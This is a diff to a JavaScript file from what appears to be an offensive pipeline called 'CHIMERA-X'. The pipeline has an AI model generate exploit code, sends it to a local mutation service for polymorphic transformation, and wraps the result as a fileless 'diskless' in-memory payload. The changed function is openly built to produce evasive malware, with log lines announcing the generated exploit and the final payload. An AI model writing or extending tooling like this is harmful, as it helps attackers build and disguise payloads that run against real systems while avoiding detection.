@@ -231,19 +231,37 @@ Return ONLY raw Python code. No markdown.`;
 
     console.log(`[✔] Base exploit generated (${baseCode.length} bytes).`);
 
-    const mutation = await chimeraTransform(baseCode, mutationLevel);
+    let mutatedData;
+    try {
+        const axios = require('axios');
+        const mutationSeed = Math.floor(Math.random() * 1000000);
+        console.log(`[🧬] Dispatching payload to LLVM/AST Mutation Engine (Seed: ${mutationSeed})...`);
+        const llvmResult = await axios.post('http://127.0.0.1:8003/api/v1/chimera/llvm-mutate', {
+            payload: baseCode,
+            seed: mutationSeed
+        });
+        mutatedData = llvmResult.data;
+        console.log(`[🧬] Mutation Complete. Mode: ${mutatedData.mode}. Hash: ${mutatedData.mutated_ir_hash.substring(0,16)}...`);
+    } catch (e) {
+        console.log(`[!] LLVM Mutator API failed: ${e.message}. Falling back to internal engine.`);
+        const fallback = await chimeraTransform(baseCode, mutationLevel);
+        mutatedData = {
+            elf_b64: Buffer.from(fallback.mutatedCode).toString('base64'),
+            mutated_ir_hash: fallback.binaryHash,
+            mode: "legacy_chimeraTransform"
+        };
+    }
 
-    const disklessPayload = wrapDiskless(mutation.mutatedCode, disklessTechnique);
+    const disklessPayload = wrapDiskless(mutatedData.elf_b64, disklessTechnique);
 
     console.log(`\n[☣️] CHIMERA-X Pipeline Complete.`);
     console.log(`[☣️] Final payload: ${disklessPayload.length} bytes (100% in-memory).`);
 
     return {
-        baseCode: mutation.originalCode,
-        mutatedCode: mutation.mutatedCode,
+        baseCode: baseCode,
+        mutatedHash: mutatedData.mutated_ir_hash,
         disklessPayload,
-        mutations: mutation.mutations,
-        binaryHash: mutation.binaryHash,
+        mode: mutatedData.mode,
         technique: disklessTechnique
     };
 };
